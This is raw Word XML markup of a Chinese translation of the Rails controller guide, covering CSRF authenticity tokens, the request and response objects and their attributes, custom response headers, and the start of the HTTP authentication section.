                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>method="post"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7285818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&lt;input</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="hidden"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06C5F8D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value="67250ab105eb5ad10851c00a5621854a23af5489"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73E76AB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name="authenticity_token"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FF644A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 fields --&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75B38D0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&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A28C98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使用 form helpers 添加这个标志到每一个表单，所以大部分时间你都不用担心它。如果你手工书写一个表单或是因为其他原因需要添加标志，可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C7E8F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form_authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 生成一个合法的验证标志。对于 Rails 无法自动添加它的地方非常有用，比如定制 Ajax 调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3540B939" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="008938C9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId354" w:history="1">
        <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>安全指南</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="006E53E9" w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 有更多关于此及很多其他你应该关注的在开发网络应用时的安全相关问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F0E9EB8"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9 请求与响应对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EEBB89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在每一个控制器中有两个存取器方法指向与请求周期相关的请求和响应对象正在执行中。</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法包含一个 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>AbstractRequest</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 实例，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法返回一个代表什么会被发送回去客户端的响应对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74160240"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 xml:space="preserve">9.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B61395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请求对象包含很多关于来自客户端的请求的有用信息。参考"API 文档":http://api.rubyonrails.org/classes/ActionDispatch/Request.html 获得一份可用方法的完整列表。你可以在这个对象的这些属性中存储：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3264"/>
        <w:gridCol w:w="5258"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="719BFB77" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BE10A88"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rPr>
              <w:t>request</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 的属性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="735DD407"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意图</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="025C1783" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="080AE5D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host</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25211CD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请求的主机名。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3CE8E050" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21FEA0E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domain(n=2)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4070A7F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主机名的前 </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>n</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 个片段，从右开始（顶级域）。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="2FD2D3E4" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4CF2234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format</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="003FEF7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客户端请求的内容类型。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5B6BDA8A" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4617B0F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method</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15EDB60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请求使用的 HTTP 方法.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="498F8B84" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="53ABD75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get?, post?, patch?, put?, delete?, head?</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0271247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如果 HTTP 方法是 GET/POST/PATCH/PUT/DELETE/HEAD 返回真。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7030E825" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="22E834F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headers</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="414431A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返回一个包含请求相关头部信息的哈希。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="01A7F90E" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1F46BA8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port</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="776F3DE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请求使用的端口号（整数）.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="333C6263" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="240A520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protocol</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3AFA668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返回一个包含协议加 “://” 的字符串，例如 “http://” 。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="0C2732CF" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2E972C3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query_string</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7887C89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URL 的查询字符串部分，例如 “?” 后的所有东西。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="38662874" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56D4DCA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remote_ip</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3F22E2D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客户端的 IP 地址。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7589F2A6" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="422AC0C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url</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D31AB6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请求使用的整个 URL 。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="482EAEEF" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">9.1.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>path_parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>query_parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">，及 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>request_parameters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41F9DE9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收集所有随请求发送来的参数到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哈希中，无论它们是被作为查询字符串或是 POST 主体。请求对象有三个存取器给予你存取这些参数，取决于它们来自哪里。</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>query_parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 哈希包含作为查询字符串发送来的参数，而 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>request</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 哈希包含作为 POST主体发送来的参数。 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>path_parameters+ 哈希包含被路由所识别的、引到特定控制器和动作的路径的参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29DC2F0D"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 xml:space="preserve">9.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F05DF6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响应对象通常不被直接使用，但是它在动作执行中构建并且染发送回用户的数据，不过有时 – 就像一个后过滤器一样 – 直接存取响应可能会有用。一些存取器方法也可以设置，允许你改变它们的值。 |</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>response</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的属性|_.意图| |body|被发送回客户端的数据的字符串。通常是 HTML 。| |status|响应的 HTTP 状态代码，像是 200 表示一个成功的请求或是 404 表示文件未找到。| |location|客户端被重定向到的 URL， 如果有的话。| |content</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>type|响应的内容类型。| |charset|响应使用的字符集。默认为 “utf-8” 。| |headers|响应使用的头部信息。|</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F58A93F" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>9.2.1 设置定制头部信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2761912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如果你想要为一个响应设置定制头部信息，那么 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>response.headers</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 就是做这个用的。头部属性是一个映射头部名称到它们值的哈希，Rails 会自动设定其中一些。如果你想要添加或改变一个头部信息，按这种如下方式分配它到 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>response.headers</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6456"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="5DD11485" w14:textId="77777777" w:rsidTr="001A6006">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="650A7901" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1032076545"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>response.headers["Content-Type"] = "application/pdf"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="390D2781"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10 HTTP 验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B15D0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Rails 自带两种内建 HTTP 验证机制：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57499A5F" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="92"/>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基本验证</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB41264" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
